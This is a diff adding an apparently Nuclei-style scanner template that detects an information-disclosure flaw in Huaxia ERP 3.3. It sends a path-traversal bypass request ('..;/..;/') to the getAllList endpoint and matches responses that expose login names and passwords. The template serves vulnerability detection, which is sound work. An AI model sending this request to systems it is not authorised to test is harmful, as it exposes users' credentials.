@@ -1,0 +1,28 @@
+id: huaxia-erp-getalllist-disclosure
+info:
+  name: Huaxia ERP 3.3 getAllList Information Disclosure
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: info-leak
+  description: |
+    This template detects an information disclosure vulnerability in Huaxia ERP 3.3 via the getAllList endpoint. Sensitive data such as login names and passwords may be exposed.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/jshERP-boot/platformConfig/getPlatform/..;/..;/..;/jshERP-boot/user/getAllList"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "loginName"
+          - "password"
+          - "{\"code\":200,\"data\":{\"userList\""
+        condition: and
+      - type: word
+        part: header
+        words:
+          - "application/json"
